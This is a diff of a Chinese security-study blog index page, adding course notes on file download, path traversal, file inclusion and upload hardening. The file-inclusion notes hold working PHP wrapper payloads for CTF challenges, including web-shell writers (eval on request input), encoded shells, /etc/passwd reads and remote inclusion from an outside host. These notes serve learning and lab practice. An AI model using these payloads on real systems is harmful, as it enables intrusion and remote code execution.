@@ -201,6 +201,354 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/28/51WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/28/51WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="post-title-link" itemprop="url">51WEB攻防-文件下载</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-28 18:50:04" itemprop="dateCreated datePublished" datetime="2023-10-28T18:50:04+08:00">2023-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:26:12" itemprop="dateModified" datetime="2023-11-06T21:26:12+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>863</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>31、文件安全-前后台功能点-下载&amp;读取&amp;删除</li>
+<li>32、目录安全-前后台功能点-目录遍历&amp;目录穿越</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="文件安全-下载-删除-黑白盒"><a href="#文件安全-下载-删除-黑白盒" class="headerlink" title="文件安全-下载&amp;删除-黑白盒"></a>文件安全-下载&amp;删除-黑白盒</h2><ul>
+<li>1、下载&#x3D;读取<br>常规下载URL：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a><br>可能存在安全URL：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a><br>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）  </li>
+<li>2、文件删除（常出现后台中）<br>可能存在安全问题：前台或后台有删除功能应用<br>利用：常规删除重装锁定配合程序重装或高危操作</li>
+</ul>
+<h2 id="目录安全-遍历-穿越-黑白盒"><a href="#目录安全-遍历-穿越-黑白盒" class="headerlink" title="目录安全-遍历&amp;穿越-黑白盒"></a>目录安全-遍历&amp;穿越-黑白盒</h2><ul>
+<li>1、目录遍历<br>目录权限控制不当，通过遍历获取到有价值的信息文件去利用  </li>
+<li>2、目录穿越（常出现后台中）<br>目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用</li>
+</ul>
+<h3 id="黑盒分析："><a href="#黑盒分析：" class="headerlink" title="黑盒分析："></a>黑盒分析：</h3><ul>
+<li>1、功能点<br>文件上传，文件下载，文件删除，文件管理器等地方  </li>
+<li>2、URL特征<br>文件名：<br>download，down，readfile，read，del，dir，path，src，Lang等<br>参数名：<br>file、path、data、filepath、readfile、data、url、realpath等</li>
+</ul>
+<h3 id="白盒分析："><a href="#白盒分析：" class="headerlink" title="白盒分析："></a>白盒分析：</h3><p>上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">50WEB攻防-文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-27 19:39:54" itemprop="dateCreated datePublished" datetime="2023-10-27T19:39:54+08:00">2023-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:26:04" itemprop="dateModified" datetime="2023-11-06T21:26:04+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>29、文件包含-原理&amp;分类&amp;危害-LFI&amp;RFI</li>
+<li>30、文件包含-利用-黑白盒&amp;无文件&amp;伪协议</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<p> <img src="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png"><br> <img src="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.png"></p>
+<h2 id="文件包含-原理-分类-利用-修复"><a href="#文件包含-原理-分类-利用-修复" class="headerlink" title="文件包含-原理&amp;分类&amp;利用&amp;修复"></a>文件包含-原理&amp;分类&amp;利用&amp;修复</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞</p>
+<ul>
+<li>1.1、分类<br>本地包含-Local File Include-LFI<br>远程包含-Remote File Include-RFI<br>差异原因：代码过滤和环境配置文件开关决定</li>
+</ul>
+<h3 id="2、白盒审计：（CTFSHOW）"><a href="#2、白盒审计：（CTFSHOW）" class="headerlink" title="2、白盒审计：（CTFSHOW）"></a>2、白盒审计：（CTFSHOW）</h3><ul>
+<li>白盒发现：<br>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等<br>PHP：include、require、include_once、require_once等<br>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require函数出现错误的时候，会直接报错并退出程序的执行<br>Java：java.io.File、java.io.FileReader等<br>ASP.NET：System.IO.FileStream、System.IO.StreamReader等</li>
+</ul>
+<h3 id="3、黑盒分析："><a href="#3、黑盒分析：" class="headerlink" title="3、黑盒分析："></a>3、黑盒分析：</h3><ul>
+<li>黑盒发现：<br>主要观察参数传递的数据和文件名是否对应<br>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</li>
+</ul>
+<h3 id="4、利用"><a href="#4、利用" class="headerlink" title="4、利用"></a>4、利用</h3><p>本地利用思路：<br>1、配合文件上传<br>2、无文件包含日志<br>3、无文件包含SESSION<br>4、无文件支持伪协议利用<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a>  </p>
+<ul>
+<li>文件读取：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd  </span><br><span class="line">php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></li>
+<li>文件写入：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-encode/resource=phpinfo.php</span><br><span class="line">php://input POST:&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br><span class="line">-代码执行：</span><br><span class="line">php://input POST:&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+远程利用思路：<br>直接搭建一个可访问的远程URL包含文件</li>
+</ul>
+<h3 id="5、修复见网上参考方案"><a href="#5、修复见网上参考方案" class="headerlink" title="5、修复见网上参考方案"></a>5、修复见网上参考方案</h3><h2 id="黑盒利用-VULWEB-有无包含文件"><a href="#黑盒利用-VULWEB-有无包含文件" class="headerlink" title="黑盒利用-VULWEB-有无包含文件"></a>黑盒利用-VULWEB-有无包含文件</h2><p><a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/showimage.php?file=index.php">http://testphp.vulnweb.com/showimage.php?file=index.php</a>  </p>
+<h2 id="白盒利用-CTFSHOW-伪协议玩法"><a href="#白盒利用-CTFSHOW-伪协议玩法" class="headerlink" title="白盒利用-CTFSHOW-伪协议玩法"></a>白盒利用-CTFSHOW-伪协议玩法</h2><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a>  </p>
+<h3 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php  </span><br><span class="line">payload: ?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;  </span><br><span class="line">payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;  </span><br></pre></td></tr></table></figure>
+<h3 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file=data://text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span><br><span class="line">payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h3><p>1、利用其他协议,如file,zlib等<br>2、利用日志记录UA特性包含执行<br>分析需文件名及带有php关键字放弃<br>故利用日志记录UA信息，UA带入代码<br>包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  </p>
+<h3 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h3><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含<br>自定义session名字，条件竞争访问session文件，触发创建新文件  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://xxxx.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a>  </p>
+<h3 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h3><ul>
+<li>1、利用base64:<br>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php<br>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;  </li>
+<li>2、利用凯撒13：<br>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php<br>content&#x3D;<?cuc riny($_CBFG[1]);?></li>
+</ul>
+<h3 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h3><p>过滤PHP，各种符号，php代码编码写出无符号base64值<br>Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk  </p>
+<h3 id="117-php-filter-write-新的算法"><a href="#117-php-filter-write-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h3><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br><span class="line">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span><br><span class="line">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span><br><span class="line">?&gt;</span><br><span class="line">Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/27/49WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/27/49WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">49WEB攻防-文件上传</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-27 10:30:53" itemprop="dateCreated datePublished" datetime="2023-10-27T10:30:53+08:00">2023-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-06 21:25:58" itemprop="dateModified" datetime="2023-11-06T21:25:58+08:00">2023-11-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>580</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>27、文件上传-安全解析方案-目录权限&amp;解码还原</li>
+<li>28、文件上传-安全存储方案-分站存储&amp;OSS对象</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
+<h2 id="文件-解析方案-执行权限-解码还原"><a href="#文件-解析方案-执行权限-解码还原" class="headerlink" title="文件-解析方案-执行权限&amp;解码还原"></a>文件-解析方案-执行权限&amp;解码还原</h2><ul>
+<li>1、执行权限<br>文件上传后存储目录不给执行权限  </li>
+<li>2、解码还原<br>数据做存储，解析固定（文件后缀名无关）<br>文件上传后利用编码传输解码还原</li>
+</ul>
+<h2 id="文件-存储方案-分站存储-OSS对象"><a href="#文件-存储方案-分站存储-OSS对象" class="headerlink" title="文件-存储方案-分站存储&amp;OSS对象"></a>文件-存储方案-分站存储&amp;OSS对象</h2><ul>
+<li>1、分站存储<br>upload.xiaodi8.com 上传<br>images.xiaodi8.com 存储  </li>
+<li>2、OSS对象<br>Access控制-OSS对象存储-Bucket对象</li>
+</ul>
+<h2 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h2><p>实例分析判断  </p>
+<h2 id="安全绕过"><a href="#安全绕过" class="headerlink" title="安全绕过"></a>安全绕过</h2><p>以上方案除目录设置权限如能换目录解析绕过外，其他均无解  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1066,372 +1414,10 @@
 
  
 
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">41WEB攻防-ASP应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 16:11:27" itemprop="dateCreated datePublished" datetime="2023-10-18T16:11:27+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 20:50:14" itemprop="dateModified" datetime="2023-11-06T20:50:14+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p> <img src="/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/image4.png"></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>1、ASP-SQL注入-Access数据库</li>
-<li>2、ASP-默认安装-数据库泄漏下载</li>
-<li>3、ASP-IIS-CVE&amp;短文件&amp;解析&amp;写入</li>
-</ul>
-<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
-<h2 id="ASP-默认安装-MDB数据库泄漏下载"><a href="#ASP-默认安装-MDB数据库泄漏下载" class="headerlink" title="ASP-默认安装-MDB数据库泄漏下载"></a>ASP-默认安装-MDB数据库泄漏下载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于大部分ASP程序与ACCESS数据库搭建，但ACCESS无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击。  </p>
